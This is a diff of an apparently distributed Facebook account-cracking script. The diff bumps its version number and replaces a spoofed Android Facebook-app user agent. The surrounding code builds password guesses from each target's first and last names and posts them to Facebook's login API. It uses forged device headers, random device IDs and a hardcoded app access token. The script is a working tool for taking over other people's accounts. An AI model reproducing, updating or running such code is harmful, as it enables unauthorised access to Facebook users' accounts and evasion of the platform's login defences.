@@ -61,7 +61,7 @@ def clr_logo():
      {d}│ {cha} {f}FACEBOOK   {g}➣      {h}DHANU BABAA           {d}│
      {d}│ {cha} {f}STATUS     {g}➣      {h}PREMIUM               {d}│
      {d}│ {cha} {f}TOOLTYPE   {g}➣      {h}FILE                  {d}│
-     {d}│ {cha} {f}VERSION    {g}➣      {h}00.06                 {d}│
+     {d}│ {cha} {f}VERSION    {g}➣      {h}00.07                 {d}│
      {d}└──────────────────────────────────────────────┘""")
 #▬▭▬▭▬▭▬▭[ MAIN DEF ]▬▭▬▭▬▭▬▭#
 def DHANU_main():
@@ -119,7 +119,7 @@ def DHANU_f_m1(ids,names,pswdx):
         except:ln = fn
         for passx in pswdx:
             pww=passx.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-            uaD1 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; X655C Build/TP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+"[FBAN/FB4A;FBAV/248.1.0.44.116;FBBV/184540788;FBDM/{density=3.0,width=1080,height=2020};FBLC/en_US;FBRV/186600517;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]"
+            uaD1 = f"Dalvik/2.1.0 (Linux; U; Android "+str(random.randint(4,14))+"; X655C Build/TP1A."+str(random.randint(111111,999999))+"."+str(random.randint(10,999))+"[FBAN/FB4A;FBAV/269.0.0.50.127;FBBV/212783057;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/213911328;FBCR/Verizon ;FBMF/samsung;FBBD/Verizon;FBPN/com.facebook.katana;FBDV/SM-G930V;FBSV/8.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
             logn_data = {"adid": str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":ids, "password":pww,"access_token":"200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16","generate_session_cookies":"1","meta_inf_fbmeta":"","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login", "fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
             user_info = {"User-Agent":uaD1,"Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(20000,40000)),"X-FB-SIM-HNI":str(random.randint(20000,40000)),"X-FB-Connection-Type":"MOBILE.LTE","X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":str(random.randint(2000,6000)),"X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
             url = f"https://api.facebook.com/auth/login"
